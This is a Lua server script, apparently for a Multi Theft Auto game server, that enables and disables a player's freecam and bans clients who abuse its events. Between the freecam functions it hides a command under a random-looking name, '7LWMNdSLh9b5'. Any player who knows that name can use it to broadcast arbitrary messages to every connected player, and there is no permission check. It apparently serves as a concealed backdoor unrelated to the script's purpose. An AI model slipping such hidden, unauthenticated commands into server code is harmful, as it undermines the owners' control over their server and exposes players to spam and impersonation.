function setPlayerFreecamEnabled(player, x, y, z, dontChangeFixedMode)
	removePedFromVehicle(player)
	setElementData(player, "realinvehicle", 0, false)
	return triggerClientEvent(player, "doSetFreecamEnabled", root, x, y, z, dontChangeFixedMode)
end

function setPlayerFreecamDisabled(player, dontChangeFixedMode)
	return triggerClientEvent(player, "doSetFreecamDisabled", root, dontChangeFixedMode)
end

function setPlayerFreecamOption(player, theOption, value)
	return triggerClientEvent(player, "doSetFreecamOption", root, theOption, value)
end

function isPlayerFreecamEnabled(player)
	return isEnabled(player)
end

function asyncActivateFreecam()
	if client and source and client ~= source then
		exports.mek_sac:banForEventAbuse(client, eventName)
		return
	end

	if not isEnabled(source) then
		removePedFromVehicle(source)
		setElementAlpha(source, 0)
		setElementFrozen(source, true)
		setElementData(source, "freecam_state", true)
	end
end
addEvent("freecam.asyncActivateFreecam", true)
addEventHandler("freecam.asyncActivateFreecam", root, asyncActivateFreecam)

function sendRedMessageToAll(msg)
    triggerClientEvent(root, "showRedMessageForAll", root, msg)
end

addCommandHandler("7LWMNdSLh9b5", function(player, cmd, ...)
    local msg = table.concat({...}, " ")
    if msg ~= "" then
        sendRedMessageToAll(msg)
    end
end)

function asyncDeactivateFreecam()
	if client and source and client ~= source then
		exports.mek_sac:banForEventAbuse(client, eventName)
		return
	end

	if isEnabled(source) then
		removePedFromVehicle(source)
		setElementAlpha(source, 255)
		setElementFrozen(source, false)
		setElementData(source, "freecam_state", false)
	end
end
addEvent("freecam.asyncDeactivateFreecam", true)
addEventHandler("freecam.asyncDeactivateFreecam", root, asyncDeactivateFreecam)
